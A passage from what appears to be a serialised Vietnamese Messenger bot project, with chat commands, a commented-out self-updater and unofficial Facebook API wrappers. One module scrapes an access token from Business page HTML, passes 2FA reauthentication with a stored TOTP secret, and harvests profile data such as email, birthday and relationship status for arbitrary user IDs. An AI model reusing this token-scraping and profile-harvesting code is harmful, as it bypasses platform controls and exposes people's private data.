3000));\n//                     Database().set(\"Instant_Update\", Date.now());\n//                     await new Promise(resolve => setTimeout(resolve, 3000));\n//                     process.exit(1);\n//                 }\n//                 catch (err) {\n//                     try {\n//                         console.log(err);\n//                         log.warn(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Failed, Trying to clean Database() cache...\");\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         execSync('npm cache clean --force', { stdio: 'inherit' });\n//                         log.info(\"[ FCA-UPDATE ] ‚Ä¢\",\"Cache Cleaned, Trying Another Method 2...\");\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         //self delete fca-horizon-remastered folder from node_modules\n//                         fs.rmdirSync((process.cwd() + \"/node_modules/fca-horizon-remastered\" || __dirname + '../../../fca-horizon-remastered'), { recursive: true });\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         execSync(`npm install fca-horizon-remastered@${Version}`, { stdio: 'inherit' });\n//                         log.info(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Complete, Restarting...\");\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         Database().set(\"Instant_Update\", Date.now(), true);\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         process.exit(1);\n//                     }\n//                     catch (e) {\n//                         console.log(e);\n//                         log.error(\"[ FCA-UPDATE ] ‚Ä¢\",\"Update Failed, Please Update Manually\");\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         log.warn(\"[ FCA-UPDATE ] ‚Ä¢\",\"Please contact to owner about update failed and screentshot error log at fb.com/Lazic.Kanzu\");\n//                         await new Promise(resolve => setTimeout(resolve, 3000));\n//                         process.exit(1);\n//                     }\n//                 }\n//             }\n//         }\n//     else {\n//         return Database().set(\"NeedRebuild\", false, true);\n//     }\n// }","path":null,"size_bytes":4533,"size_tokens":null},"modules/commands/siesta.js":{"content":"module.exports.config = {\n  name: \"siesta\",\n  version: \"2.0.0\",\n  hasPermssion: 0,\n  credits: \"Vtuan\",\n  description: \"Xem ·∫£nh\",\n  commandCategory: \"Random-img\",\n  usages: \"\",\n  cooldowns: 30\n};\n\nmodule.exports.run = async ({ api, event ,Users}) => {\n  const axios = require('axios');\n  const request = require('request');\n  const fs = require(\"fs\");\n  const girl = require('./../../img/siesta.json');\n  var image1 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image2 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image3 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image4 = girl[Math.floor(Math.random() * girl.length)].trim();\n  function downloadAndSendImage(image,fileName,callback){\n    request(image).pipe(fs.createWriteStream(__dirname + `/`+fileName)).on(\"close\", callback);\n  }\n  let callback = function () {\n    return api.sendMessage({\n      body: '',\n      attachment: [\n       fs.createReadStream(__dirname + `/1.png`), \n       fs.createReadStream(__dirname + `/2.png`), \n       fs.createReadStream(__dirname + `/3.png`), \n       fs.createReadStream(__dirname + `/4.png`)\n      ]\n    }, event.threadID, () => {\n      fs.unlinkSync(__dirname + `/1.png`);\n      fs.unlinkSync(__dirname + `/2.png`);\n      fs.unlinkSync(__dirname + `/3.png`);\n      fs.unlinkSync(__dirname + `/4.png`);\n    }, event.messageID);\n  };\n  downloadAndSendImage(image1,'1.png',()=>{\n    downloadAndSendImage(image2,'2.png',()=>{\n      downloadAndSendImage(image3,'3.png',()=>{\n        downloadAndSendImage(image4,'4.png',callback)\n      })\n    })\n  }) \n}","path":null,"size_bytes":1591,"size_tokens":null},"modules/commands/sleep.js":{"content":"module.exports.config = {\n\tname: \"sleep\",\n\tversion: \"1.0.1\",\n\thasPermssion: 0,\n\tcredits: \"Mirai Team\",\n\tdescription: \"T√≠nh th·ªùi gian ƒëi ng·ªß ho√†n h·∫£o cho b·∫°n\",\n\tcommandCategory: \"C√¥ng c·ª•\",\n\tusages: \"[Time]\",\n\tcooldowns: 5,\n\tdependencies: {\n\t\t\"moment-timezone\": \"\"\n\t}\n};\n\nmodule.exports.languages = {\n\t\"vi\": {\n\t\t\"returnTimeNow\": \"N·∫øu b·∫°n ƒëi ng·ªß b√¢y gi·ªù, nh·ªØng th·ªùi gian ho√†n h·∫£o nh·∫•t ƒë·ªÉ th·ª©c d·∫≠y l√†:\\n%1\\nƒê√¢y l√† chu k·ª≥ gi·∫•c ng·ªß 90 ph√∫t b·∫°n c√≥ th·ªÉ t√¨m hi·ªÉu th√™m tr√™n goole\",\n\t\t\"returnTimeSet\": \"N·∫øu b·∫°n ƒëi ng·ªß v√†o l√∫c %1, nh·ªØng th·ªùi gian ho√†n h·∫£o nh·∫•t ƒë·ªÉ th·ª©c d·∫≠y l√†:\\n%2\"\t\n\t},\n\t\"en\": {\n\t\t\"returnTimeNow\": \"If you go to sleep now, the perfect time to wake up is:\\n%1\",\n\t\t\"returnTimeSet\": \"If you go to sleep at %1, perfect times to wake up is:\\n%2\"\t\n\t}\n}\n\nmodule.exports.run = function({ api, event, args, getText }) {\n\tconst { threadID, messageID } = event;\n\tconst { throwError } = global.utils;\n\tconst moment = global.nodemodule[\"moment-timezone\"];\n\n\tvar wakeTime = [];\n\tlet content = args.join(\" \")\n\tif (!content) {\n\t\tfor (var i = 1; i < 7; i++) wakeTime.push(moment().tz(\"Asia/Ho_Chi_Minh\").add(90 * i + 15, 'm').format(\"HH:mm\"));\n\t\treturn api.sendMessage(getText(\"returnTimeNow\", wakeTime.join(', ')), threadID, messageID);\n\t}\n\telse {\n\t\tif (content.indexOf(\":\") == -1) return throwError(this.config.name, threadID, messageID);\n\t\tvar contentHour = content.split(\":\")[0];\n\t\tvar contentMinute = content.split(\":\")[1];\n\t\tif (isNaN(contentHour) || isNaN(contentMinute) || contentHour > 23 || contentMinute > 59 || contentHour < 0 || contentMinute < 0 || contentHour.length != 2 || contentMinute.length != 2) return global.utils.throwError(this.config.name, threadID, messageID);\n\t\tvar getTime = moment().tz(\"Asia/Ho_Chi_Minh\").format();\n\t\tvar time = getTime.slice(getTime.indexOf(\"T\") + 1, getTime.indexOf(\"+\"));\n\t\tvar hour = time.split(\":\")[0];\n\t\tvar minute = time.split(\":\")[1];\n\t\tvar sleepTime = getTime.replace(hour + \":\", contentHour + \":\").replace(minute + \":\", contentMinute + \":\");\n\t\tfor (var i = 1; i < 7; i++) wakeTime.push(moment(sleepTime).tz(\"Asia/Ho_Chi_Minh\").add(90 * i + 15, 'm').format(\"HH:mm\"));\n\t\treturn api.sendMessage(getText(\"returnTimeSet\", content, wakeTime.join(', ')), threadID, messageID);\n\t}\n}  ","path":null,"size_bytes":2308,"size_tokens":null},"modules/commands/hangdangthuc.js":{"content":"module.exports.config = {\n\tname: \"hangdangthuc\",\n\tversion: \"1.0.0\",\n\thasPermssion: 0,\n\tcredits: \"LeMinh\",\n\tdescription: \"H·∫±ng ƒë·∫≥ng th·ª©c ƒë√°ng nh·ªõ\",\n\tcommandCategory: \"Ki·∫øn Th·ª©c\",\n\tcooldowns: 0\n};\n\nmodule.exports.run = ({ event, api }) => api.sendMessage(`  HƒÉÃÄng ƒêƒÉÃâng Th∆∞ÃÅc\n\t\t\n1/ B√¨nh ph∆∞∆°ng c·ªßa 1 t·ªïng: (a + b)¬≤ = a¬≤ + 2ab + b¬≤ = (a ‚àí b)¬≤ + 4ab\n\n2/ B√¨nh ph∆∞∆°ng c·ªßa 1 hi·ªáu: (a ‚àí b)¬≤ = a¬≤ - 2ab + b¬≤ = (a + b)¬≤ ‚àí 4ab\n\n3/ Hi·ªáu 2 b√¨nh ph∆∞∆°ng: a¬≤ ‚àí b¬≤ = (a ‚àí b)(a + b)\n\n4/ L·∫≠p ph∆∞∆°ng c·ªßa 1 t·ªïng: (a + b)¬≥ = a¬≥ + 3a¬≤b + 3ab¬≤ + b¬≥\n\n5/ L·∫≠p ph∆∞∆°ng c·ªßa 1 hi·ªáu: (a ‚àí b)¬≥ = a¬≥ ‚àí 3a¬≤b + 3ab¬≤ ‚àí b¬≥\n\n6/ T·ªïng 2 l·∫≠p ph∆∞∆°ng: a¬≥ + b¬≥ = (a + b)(a¬≤ ‚àí ab + b¬≤) = (a + b)¬≥ ‚àí 3a¬≤b ‚àí 3ab¬≤ = (a + b)¬≥ ‚àí 3ab(a + b)\n\n7/ Hi·ªáu 2 l·∫≠p ph∆∞∆°ng: a¬≥ ‚àí b¬≥ = (a ‚àí b)(a¬≤ + ab + b¬≤) = (a ‚àí b)3 + 3a¬≤b ‚àí 3ab¬≤ = (a ‚àí b)3 + 3ab(a ‚àí b)\n\nC√°c h·ªá th·ª©c li√™n quan\n\n1/ (a + b + c)¬≥ = a¬≥ + b¬≥ + c¬≥ + 3(a + b)(b + c)(a + c)\n\n2/ a¬≥ + b¬≥ + c¬≥ ‚àí 3abc = (a + b + c)(a¬≤ + b¬≤ + c¬≤ ‚àí ab ‚àí bc ‚àí ac)\n\n3/ (a ‚àí b ‚àí c)¬≤ = a¬≤ + b¬≤ + c¬≤ - 2ab + 2bc ‚àí 2ac\n\n4/ (a + b + c)¬≤ = a¬≤ + b¬≤ + c¬≤ + 2ab + 2bc + 2ac\n\n5/ (a + b ‚àí c)¬≤ = a¬≤ + b¬≤ + c¬≤ + 2ab ‚àí 2bc ‚àí 2ac`, event.threadID, event.messageID);","path":null,"size_bytes":1312,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Security/Step_1.js":{"content":"'use strict';\n\nvar CryptoJS = require(\"crypto-js\");\nmodule.exports.EncryptState = function EncryptState(Data,PassWord) { return CryptoJS.AES.encrypt(Data, PassWord).toString(); };\n\nmodule.exports.DecryptState = function DecryptState(Data,PassWord) { return CryptoJS.AES.decrypt(Data, PassWord).toString(CryptoJS.enc.Utf8); };","path":null,"size_bytes":325,"size_tokens":null},"lib/fca-auto/Extra/Html/Classic/style.css":{"content":"html {\n    background:#ecf0f1;\n  }\n  canvas {\n    display:block;\n    margin:auto;\n    background:#ecf0f1;\n  }","path":null,"size_bytes":109,"size_tokens":null},"lib/fca-auto/Extra/ExtraAddons.js":{"content":"'use strict';\n\nvar utils = require('../utils');\nvar logger = require('../logger')\nvar OTP = require('totp-generator');\n\nmodule.exports.getInfo = async function (id,jar,ctx,defaultFuncs) {\n    var AccessToken = await module.exports.getAccessToken(jar,ctx,defaultFuncs);\n    var { body:Data } = await utils.get(`https://graph.facebook.com/${id}?fields=age_range,picture,cover,name,first_name,email,about,birthday,gender,website,hometown,link,location,quotes,relationship_status,significant_other,username,subscribers.limite(0)&access_token=${AccessToken}`,jar,null,ctx.globalOptions);\n    var Format = {\n        id: JSON.parse(Data).id || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        name: JSON.parse(Data).name || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        first_name: JSON.parse(Data).first_name || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        username: JSON.parse(Data).username || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        link: JSON.parse(Data).link || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        verified: JSON.parse(Data).verified || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        about: JSON.parse(Data).about || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        avatar: JSON.parse(Data).picture.data.url || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        cover: JSON.parse(Data).cover.source || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        birthday: JSON.parse(Data).birthday || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        age: JSON.parse(Data).age_range.min || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        follow: JSON.parse(Data).subscribers.summary.total_count || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        gender: JSON.parse(Data).gender || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        hometown: JSON.parse(Data).hometown || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        email: JSON.parse(Data).email || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        interested_in: JSON.parse(Data).interested_in || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        location: JSON.parse(Data).location || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        locale: JSON.parse(Data).locale || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        relationship_status: JSON.parse(Data).relationship_status || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        love: JSON.parse(Data).significant_other || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        website: JSON.parse(Data).website || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        quotes: JSON.parse(Data).quotes || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        timezone: JSON.parse(Data).timezone || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        updated_time: JSON.parse(Data).updated_time || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\"\n    }\n    return Format;\n}\n\n/**\n * Help: @ManhG\n * Author: @KanzuWakazaki\n*/\n\nmodule.exports.getAccessToken = async function (jar, ctx,defaultFuncs) {\n    if (global.Fca.Data.AccessToken) {\n        return global.Fca.Data.AccessToken;\n    }\n    else {\n        var nextURLS = \"https://business.facebook.com/security/twofactor/reauth/enter/\"\n        return defaultFuncs.get('https://business.facebook.com/content_management', jar, null, ctx.globalOptions).then(async function(data) {\n            try {\n                if (/\"],\\[\"(.*?)\",\"/.exec(/LMBootstrapper(.*?){\"__m\":\"LMBootstrapper\"}/.exec(data.body)[1])[1])  {\n                    global.Fca.Data.AccessToken = /\"],\\[\"(.*?)\",\"/.exec(/LMBootstrapper(.*?){\"__m\":\"LMBootstrapper\"}/.exec(data.body)[1])[1];\n                    return /\"],\\[\"(.*?)\",\"/.exec(/LMBootstrapper(.*?){\"__m\":\"LMBootstrapper\"}/.exec(data.body)[1])[1];\n                }\n            }\n            catch (_) {\n                if (global.Fca.Require.FastConfig.AuthString.includes('|')) return logger.Error(global.Fca.Require.Language.Index.Missing)\n                var OPTCODE = global.Fca.Require.FastConfig.AuthString.includes(\" \") ? global.Fca.Require.FastConfig.AuthString.replace(RegExp(\" \", 'g'), \"\") : global.Fca.Require.FastConfig.AuthString;\n                var Form = { \n                    approvals_code: OTP(String(OPTCODE)),\n                    save_device: false,\n                    lsd: utils.getFrom(data.body, \"[\\\"LSD\\\",[],{\\\"token\\\":\\\"\", \"\\\"}\")\n                }\n                return defaultFuncs.post(nextURLS, jar, Form, ctx.globalOptions, { \n                    referer: \"https://business.facebook.com/security/twofactor/reauth/?twofac_next=https%3A%2F%2Fbusiness.facebook.com%2Fcontent_management&type=avoid_bypass&app_id=0&save_device=0\",\n                }).then(async function(dataa) {\n                    if (String(dataa.body).includes(false)) throw { Error: \"Invaild OTP | FastConfigFca.json: AuthString\" }\n                    return utils.get('https://business.facebook.com/content_management', jar, null, ctx.globalOptions,{ \n                        referer: \"https://business.facebook.com/security/twofactor/reauth/?twofac_next=https%3A%2F%2Fbusiness.facebook.com%2Fcontent_management&type=avoid_bypass&app_id=0&save_device=0\",\n                    }).then(async function(data) {\n                        var Access_Token = /\"],\\[\"(.*?)\",\"/.exec(/BusinessToolEmptyView.brands.react(.*?){\"__m\":\"BusinessToolEmptyView.brands.react\"}/.exec(data.body)[1])[1];\n                        global.Fca.Data.AccessToken = Access_Token;\n                        return Access_Token;\n                    });\n                });\n            }\n        })\n    }\n}\n\n//hard working =))","path":null,"size_bytes":5094,"size_tokens":null},"includes/database/models/users.js":{"content":"module.exports = function({ sequelize, Sequelize }) {\n\tlet Users = sequelize.define('Users', {\n\t\tnum: {\n\t\t\ttype: Sequelize.INTEGER,\n\t\t\tprimaryKey: true,\n\t\t\tautoIncrement: true\n\t\t},\n\t\tuserID: {\n\t\t\ttype: Sequelize.BIGINT,\n\t\t\tunique: true\n\t\t},\n        name: {\n            type: Sequelize.STRING\n        },\n        gender: {\n            type: Sequelize.STRING\n        },\n\t\tdata: {\n\t\t\ttype: Sequelize.JSON\n\t\t}\n\t});\n\n\treturn Users;\n}","path":null,"size_bytes":427,"size_tokens":null},"lib/fca-auto/src/getUserInfoMain.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nfunction formatData(data) {\n  var retObj = {};\n\n  for (var prop in data) {\n    // eslint-disable-next-line no-prototype-builtins\n    if (data.hasOwnProperty(prop)) {\n      var innerObj = data[prop];\n      retObj[prop] = {\n        name: innerObj.name,\n        firstName: innerObj.firstName,\n        vanity: innerObj.vanity,\n        thumbSrc: innerObj.thumbSrc,\n        profileUrl: innerObj.uri,\n        gender: innerObj.gender,\n        type: innerObj.type,\n        isFriend: innerObj.is_friend,\n        isBirthday: !!innerObj.is_birthday\n      };\n    }\n  }\n\n  return retObj;\n}\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function getUserInfo(id, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, userInfo) {\n        if (err) return rejectFunc(err);\n        resolveFunc(userInfo);\n      };\n    }\n\n    if (utils.getType(id) !== \"Array\") id = [id];\n\n    var form = {};\n    id.map(function (v, i) {\n      form[\"ids[\" + i + \"]\"] = v;\n    });\n    defaultFuncs\n      .post(\"https://www.facebook.com/chat/user_info/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n        return callback(null, formatData(resData.payload.profiles));\n      })\n      .catch(function (err) {\n        log.error(\"getUserInfo\", \"L·ªói: getUserInfo C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu !,H√£y Th·ª≠ L·∫°i !\");\n        return callback(err);\n      });\n    return returnPromise;\n  };\n};","path":null,"size_bytes":1770,"size_tokens":null},"lib/fca-auto/src/markAsSeen.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function markAsSeen(seen_timestamp, callback) {\n    if (utils.getType(seen_timestamp) == \"Function\" ||\n      utils.getType(seen_timestamp) == \"AsyncFunction\") {\n      callback = seen_timestamp;\n      seen_timestamp = Date.now();\n    }\n\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n\n        resolveFunc(data);\n      };\n    }\n\n    var form = {\n      seen_timestamp: seen_timestamp\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/mercury/mark_seen.php\", ctx.jar, form)\n      .then(utils.saveCookies(ctx.jar))\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"markAsSeen\", err);\n        if (utils.getType(err) == \"Object\" && err.error === \"Not logged in.\") ctx.loggedIn = false;\n\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1343,"size_tokens":null},"modules/commands/uid.js":{"content":"module.exports.config = {\n    name: \"uid\",\n    version: \"1.2.0\",\n    hasPermssion: 0,\n    credits: \"TatsuYTB\",\n    description: \"L·∫•y UID ng∆∞·ªùi d√πng.\",\n    commandCategory: \"Ti·ªán √≠ch\",\n    cooldowns: 5,\n    prefix: \"\",\n};\n\nmodule.exports.handleEvent = async ({ api, event, Users }) => {\n    const { threadID, messageID, body, mentions, senderID, messageReply } = event;\n    if (body.startsWith(\"uid\")) {\n        let uid;\n        if (event.type == \"message_reply\") {\n            uid = messageReply.senderID;\n        } else if (body.indexOf('@') !== -1) {\n            uid = Object.keys(mentions)[0];\n        } else {\n            uid = senderID;\n        }\n        const name = await Users.getNameUser(uid);\n        api.sendMessage(uid, threadID, messageID);\n    }\n};\n\nmodule.exports.run = async ({ api, event, Users, args }) => {\n    const { threadID, messageID, mentions, senderID, messageReply } = event;\n    let uid;\n    if (event.type == \"message_reply\") {\n        uid = messageReply.senderID;\n    } else if (args.join().indexOf('@') !== -1) {\n        uid = Object.keys(mentions)[0];\n    } else {\n        uid = senderID;\n    }\n    const name = await Users.getNameUser(uid);\n    return api.sendMessage(uid, threadID, messageID);\n};\n","path":null,"size_bytes":1240,"size_tokens":null},"modules/commands/money.js":{"content":"module.exports.config = {\n    name: \"money\",\n    version: \"0.0.1\",\n    hasPermssion: 0,\n    credits: \"Mirai Team\",//mod by ARAXY XD\n    description: \"Ki·ªÉm tra s·ªë ti·ªÅn c·ªßa b·∫£n th√¢n ho·∫∑c ng∆∞·ªùi ƒë∆∞·ª£c tag\",\n    commandCategory: \"Ti·ªán √≠ch\",\n    usages: \"[Tag]\",\n    cooldowns: 5\n};\n\nmodule.exports.run = async function({ api, event, args, Currencies, Users }) {\n    const { threadID, messageID, senderID, mentions } = event;\n    const fs = require('fs');\n    const axios = require('axios');\n\n    // H√†m l√†m tr√≤n s·ªë v·ªÅ ph·∫ßn nguy√™n g·∫ßn nh·∫•t\n    function formatNumber(num) {\n        return Math.floor(num).toString().replace(/\\B(?=(\\d{3})+(?!\\d))/g, '.');\n    }\n\n    if(!fs.existsSync(__dirname+'/cache/SplineSans-Medium.ttf')) { \n        let getfont = (await axios.get(`https://drive.google.com/u/0/uc?id=102B8O3_0vTn_zla13wzSzMa-vdTZOCmp&export=download`, { responseType: \"arraybuffer\" })).data;\n        fs.writeFileSync(__dirname+\"/cache/SplineSans-Medium.ttf\", Buffer.from(getfont, \"utf-8\"));\n    };\n    if(!fs.existsSync(__dirname+'/cache/SplineSans.ttf')) { \n        let getfont2 = (await axios.get(`https://drive.google.com/u/0/uc?id=1--V7DANKLsUx57zg8nLD4b5aiPfHcmwD&export=download`, { responseType: \"arraybuffer\" })).data;\n        fs.writeFileSync(__dirname+\"/cache/SplineSans.ttf\", Buffer.from(getfont2, \"utf-8\"));\n    };\n\n    let name, money;\n\n    if (event.type == \"message_reply\") {\n        const uid = event.messageReply.senderID;\n        name = (await Users.getData(uid)).name;\n        money = (await Currencies.getData(uid)).money || 0;\n    } else if (Object.keys(event.mentions).length == 1) {\n        const mention = Object.keys(mentions)[0];\n        name = (await Users.getData(mention)).name;\n        money = (await Currencies.getData(mention)).money || 0;\n    } else {\n        name = (await Users.getData(senderID)).name;\n        money = (await Currencies.getData(senderID)).money || 0;\n    }\n\n    const argss = formatNumber(money);\n\n    const { loadImage, createCanvas } = require(\"canvas\");\n    const path = __dirname + \"/cache/atmaraxy.png\";\n    const bg = (await axios.get(`https://i.ibb.co/NZD1Zzz/image.png`, {responseType: \"arraybuffer\" })).data;\n    fs.writeFileSync(path, Buffer.from(bg, \"utf-8\"));\n    const bgBase = await loadImage(path);\n    const canvas = createCanvas(bgBase.width, bgBase.height);\n    const ctx = canvas.getContext(\"2d\");\n    const Canvas = global.nodemodule[\"canvas\"];\n    ctx.drawImage(bgBase, 0, 0, canvas.width, canvas.height);\n    Canvas.registerFont(__dirname+`/cache/SplineSans-Medium.ttf`, {\n        family: \"SplineSans-Medium\"\n    });\n    Canvas.registerFont(__dirname+`/cache/SplineSans.ttf`, {\n        family: \"SplineSans\"\n    });\n    ctx.font = \"50px SplineSans-Medium\";\n    ctx.fillStyle = \"#000000\";\n    ctx.textAlign = \"center\";\n    ctx.fillText('' + argss + 'ƒë', 530, 359);\n    const imageBuffer = canvas.toBuffer();\n    fs.writeFileSync(path, imageBuffer);\n\n    const msg = {\n        body: `S·ªë ti·ªÅn c·ªßa b·∫°n ${name} ƒë√¢y\\nS·ªë ti·ªÅn c·ªßa b·∫°n ƒëang c√≥ l√† ${argss}`,\n        attachment: fs.createReadStream(path)\n    };\n\n    return api.sendMessage(msg, threadID, async (error, info) => {\n        fs.unlinkSync(path);\n        messageID;\n    });\n};\n","path":null,"size_bytes":3258,"size_tokens":null},"modules/commands/setlove.js":{"content":"module.exports.config = {\n    name: \"setlove\",\n    version: \"1.1.0\",\n    hasPermssion: 0,\n    credits: \"TatsuYTB\",\n    description: \"Set love with someone\",\n    commandCategory: \"Tr√≤ Ch∆°i\",\n    usages: \"#setlove set @tag | #setlove check | #setlove huy | #setlove suaanh | #setlove list\",\n    cooldowns: 5,\n    dependencies: {\n        \"fs-extra\": \"\",\n        \"axios\": \"\"\n    }\n};\n\nconst fs = global.nodemodule[\"fs-extra\"];\nconst axios = global.nodemodule[\"axios\"];\nconst path = require(\"path\");\nconst dataPath = path.resolve(__dirname, 'data', 'setlove.json');\nconst imagesPath = path.resolve(__dirname, 'data', 'setlove');\n\nmodule.exports.onLoad = () => {\n    if (!fs.existsSync(dataPath)) {\n        fs.ensureFileSync(dataPath);\n        fs.writeJsonSync(dataPath, []);\n    }\n    if (!fs.existsSync(imagesPath)) {\n        fs.mkdirSync(imagesPath);\n    }\n};\n\nmodule.exports.run = async function ({ event, api, args }) {\n    const { threadID, messageID, senderID, mentions } = event;\n    const loveData = fs.readJsonSync(dataPath);\n\n    const command = args[0];\n    const checkAdmin = () => global.config.ADMINBOT.includes(senderID);\n    if (command === \"list\") {\n        (async () => {\n            if (!checkAdmin()) {\n                return api.sendMessage(\"ùêÅùêöÃ£ùêß ùê§ùê°ùê®ÃÇùêßùê† ùêúùê®ÃÅ ùê™ùêÆùê≤ùêûÃÇÃÄùêß!!!\", threadID, messageID);\n            }\n    \n            if (loveData.length === 0) {\n                return api.sendMessage(\"ùêáùêûÃ£ÃÇ ùê≠ùê°ùê®ÃÇùêßùê† ùêúùê°ùêÆÃõùêö ùêúùê®ÃÅ ùêúùêöÃ£ÃÜùê© ùêíùêûùê≠ùêãùê®ùêØùêû ùêßùêöÃÄùê®.üíî\", threadID, messageID);\n            }\n    \n            let response = \"üíñ ùêÉùêöùêßùê° ùê¨ùêöÃÅùêúùê° ùêíùêûùê≠ùêãùê®ùêØùêû üíñ\\n\";\n            const now = new Date();\n    \n            for (let i = 0; i < loveData.length; i++) {\n                const rel = loveData[i];\n    \n                const userInfo1 = await api.getUserInfo(rel.person1);\n                const userInfo2 = await api.getUserInfo(rel.person2);\n    \n                const name1 = userInfo1[rel.person1]?.name || \"Kh√¥ng r√µ\";\n                const name2 = userInfo2[rel.person2]?.name || \"Kh√¥ng r√µ\";\n    \n                const date = new Date(rel.date);\n                const duration = Math.floor((now - date) / (1000 * 60 * 60 * 24));\n    \n                response += `\\n${i + 1}. ${name1} ‚ù§Ô∏è ${name2}\\n- UID 1: ${rel.person1}\\n- UID 2: ${rel.person2}\\n- Ng√†y SetLove: ${date.toLocaleDateString()}\\n- ƒê√£ ƒë∆∞·ª£c: ${duration} ng√†y.`;\n            }\n    \n            response += \"\\n\\nüëâ H√£y reply s·ªë th·ª© t·ª± c·∫∑p SetLove ƒë·ªÉ x√≥a.\";\n            return api.sendMessage(response, threadID, (error, info) => {\n                global.client.handleReply.push({\n                    name: this.config.name,\n                    messageID: info.messageID,\n                    author: senderID,\n                    type: \"deleteSetLove\"\n                });\n            }, messageID);\n        })();\n    }    \n    else if (command === \"set\") {\n        if (Object.keys(mentions).length === 0) {\n            return api.sendMessage(\"ùêïùêÆùê¢ ùê•ùê®ÃÄùêßùê† ùê≠ùêöùê† ùê¶ùê®Ã£ÃÇùê≠ ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢ ùêùùêûÃÇÃâ ùê¨ùêûùê≠ùê•ùê®ùêØùêûüòΩ\", threadID, messageID);\n        }\n\n        const taggedUserID = Object.keys(mentions)[0];\n        const taggedUserName = mentions[taggedUserID];\n\n        const existingRelationship = loveData.find(relationship =>\n            relationship.person1 === senderID || relationship.person2 === senderID ||\n            relationship.person1 === taggedUserID || relationship.person2 === taggedUserID\n        );\n\n        if (existingRelationship) {\n            const existingPartnerID = existingRelationship.person1 === senderID ? existingRelationship.person2 : existingRelationship.person1;\n            const existingPartnerName = (await api.getUserInfo(existingPartnerID))[existingPartnerID].name;\n\n            if (existingRelationship.person1 === senderID || existingRelationship.person2 === senderID) {\n                return api.sendMessage(`ùêìùê´ùê®ùêßùê† ùê¶ùê®Ã£ÃÇùê≠ ùê¶ùê®ÃÇÃÅùê¢ ùê≠ùê¢ÃÄùêßùê° ùê§ùê°ùê®ÃÇùêßùê† ùêùùêÆÃõùê®ÃõÃ£ùêú ùêúùê®ÃÅ ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢ ùê≠ùê°ùêÆÃõÃÅ ùüëüòæ`, threadID, messageID);\n            } else {\n                return api.sendMessage(`ùêÅùêöÃ£ùêß ùê§ùê°ùê®ÃÇùêßùê† ùê≠ùê°ùêûÃÇÃâ ùêúùêÆÃõùê®ÃõÃÅùê© ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢ ùê≠ùê°ùêÆÃõùê®Ãõùêßùê† ùêúùêÆÃâùêö ${existingPartnerName}üòæ`, threadID, messageID);\n            }\n        }\n\n        api.sendMessage({\n            body: `${taggedUserName}, ùêõùêöÃ£ùêß ùêúùê®ÃÅ ùêúùê°ùêöÃÇÃÅùê© ùêßùê°ùêöÃ£ÃÇùêß ùê≤ùêûÃÇùêÆ ùêúùêöÃÇÃÄùêÆ ùê¨ùêûùê≠ ùê•ùê®ùêØùêû ùê§ùê°ùê®ÃÇùêßùê†?üòª\\nùêáùêöÃÉùê≤ ùê≠ùê°ùêöÃâ ùêúùêöÃâùê¶ ùê±ùêÆÃÅùêú ùêØùêöÃÄùê® ùê≠ùê¢ùêß ùêßùê°ùêöÃÜÃÅùêß ùêßùêöÃÄùê≤ ùêùùêûÃÇÃâ 